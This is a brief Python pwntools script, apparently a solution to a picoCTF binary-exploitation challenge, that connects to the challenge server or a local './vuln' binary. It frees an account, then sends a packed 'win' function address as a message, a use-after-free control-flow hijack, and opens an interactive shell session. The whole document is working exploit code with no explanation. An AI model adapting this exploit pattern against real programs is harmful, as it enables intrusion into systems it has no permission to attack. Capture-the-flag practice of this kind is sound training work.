from pwn import p32, process, ELF, remote, context

def exploit(checkRemote):
    if(checkRemote is True):
        r = remote('mercury.picoctf.net', 61817)
    else:
        context.binary = binary = ELF('./vuln', False)
        r = process()
    
    # Free account
    r.recvuntil('xit\n')
    r.sendline(b'i')
    r.recvuntil('?\n')
    r.sendline(b'y')

    # Leave message
    win = p32(0x080487d6) 
    
    r.recvuntil('xit\n')
    r.sendline(b'l')
    r.recvuntil('anyways:\n')
    r.sendline(win)

    r.interactive()
exploit(True)